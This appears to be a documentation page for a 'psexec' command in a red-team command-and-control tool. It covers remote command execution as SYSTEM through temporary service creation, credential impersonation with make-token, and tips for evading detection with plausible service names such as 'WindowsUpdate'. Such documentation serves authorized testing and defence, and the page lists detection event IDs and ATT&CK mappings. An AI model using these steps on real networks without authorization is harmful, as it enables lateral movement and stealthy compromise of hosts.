+++
title = "psexec"
chapter = false
weight = 112
hidden = false
+++

## Summary

Execute commands on remote hosts via SCM (Service Control Manager) service creation — PSExec-style lateral movement. Connects to the remote host's SCM, creates a temporary service with the specified command as its binary path, starts it, and cleans up. Uses the current security context for authentication (use `make-token` or `steal-token` first for different credentials).

{{% notice info %}}Windows Only{{% /notice %}}

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| host | Yes | - | Target hostname or IP address |
| command | Yes | - | Command to execute (automatically wrapped in `cmd.exe /c`) |
| name | No | (random) | Custom service name (random plausible name if not specified) |
| display | No | (same as name) | Service display name |
| cleanup | No | true | Delete the service after execution |

## Usage

### Basic Remote Command Execution
```
psexec -host 192.168.1.10 -command "whoami > C:\Windows\Temp\out.txt"
psexec -host DC01.domain.local -command "net user /domain"
```

### With Custom Service Name
```
psexec -host 192.168.1.10 -command "whoami" -name "WindowsUpdate" -display "Windows Update Service"
```

### Keep Service (No Cleanup)
```
psexec -host 192.168.1.10 -command "C:\payload.exe" -cleanup false
```

### With Credential Impersonation
```
make-token -user admin -password P@ssw0rd -domain CORP
psexec -host 192.168.1.10 -command "whoami > C:\Windows\Temp\out.txt"
rev2self
```

## Example Output

```
PSExec on 192.168.1.10:
  Service:  WinMgmt3a7f
  Command:  C:\Windows\System32\cmd.exe /c whoami > C:\Windows\Temp\out.txt
  Cleanup:  true

[1] Connecting to remote SCM...
  Connected.
[2] Creating service 'WinMgmt3a7f'...
  Created.
[3] Starting service...
  Start result: The service did not respond to the start or control request in a timely fashion.
  (Expected — command executed and exited quickly)
[4] Cleaning up...
  Service deleted.

Done.
```

## How It Works

1. **Connect** to the remote SCM via `OpenSCManager` with `SC_MANAGER_ALL_ACCESS`
2. **Create** a temporary service with `SERVICE_WIN32_OWN_PROCESS` type and `SERVICE_DEMAND_START`
3. **Start** the service — SCM calls `CreateProcess` with the binary path
4. The command runs as **NT AUTHORITY\SYSTEM** (default service account)
5. `cmd.exe /c` executes the command and exits immediately
6. SCM reports error 1053 (expected — cmd.exe isn't a proper service binary)
7. **Delete** the service (if cleanup=true)

## Operational Notes

- **Authentication**: Uses the current Windows security context. For remote hosts, use `make-token` to impersonate a user with admin privileges on the target.
- **Error 1053 is expected**: When cmd.exe finishes and exits without calling `StartServiceCtrlDispatcher`, SCM returns error 1053. This is normal PSExec behavior — the command still executed.
- **Runs as SYSTEM**: Services run as LocalSystem by default. Write output to paths accessible by SYSTEM (e.g., `C:\Windows\Temp\`).
- **No output capture**: This command is fire-and-forget. To capture output, redirect to a file and retrieve it separately.
- **Detection**: Service creation generates Event ID 7045 in the System log and 4697 in the Security log. Consider using a plausible service name.
- **Random service names**: When no name is specified, a random plausible name like `WinMgmt3a7f` or `NetSvc82b1` is generated.

## MITRE ATT&CK Mapping

- **T1021.002** — Remote Services: SMB/Windows Admin Shares
- **T1569.002** — System Services: Service Execution
